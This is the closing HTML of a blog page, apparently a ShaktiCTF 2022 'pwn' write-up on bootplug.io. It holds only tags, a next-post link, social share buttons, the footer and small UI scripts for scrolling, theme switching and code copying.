</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://bootplug.io/tags/pwn/>pwn</a></li></ul><nav class=paginav><a class=next href=https://bootplug.io/posts/ctf/m0leconctf_2022/><span class=title>Next Page »</span><br><span>m0leCon CTF 2022 Teaser</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on twitter" href="https://twitter.com/intent/tweet/?text=ShaktiCTF%202022&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f&hashtags=pwn"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f&title=ShaktiCTF%202022&summary=ShaktiCTF%202022&source=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f&title=ShaktiCTF%202022"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on whatsapp" href="https://api.whatsapp.com/send?text=ShaktiCTF%202022%20-%20https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ShaktiCTF 2022 on telegram" href="https://telegram.me/share/url?text=ShaktiCTF%202022&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fshaktictf_22%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://bootplug.io/>Blog | bootplug</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="copy";function s(){t.innerText="copied!",setTimeout(()=>{t.innerText="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>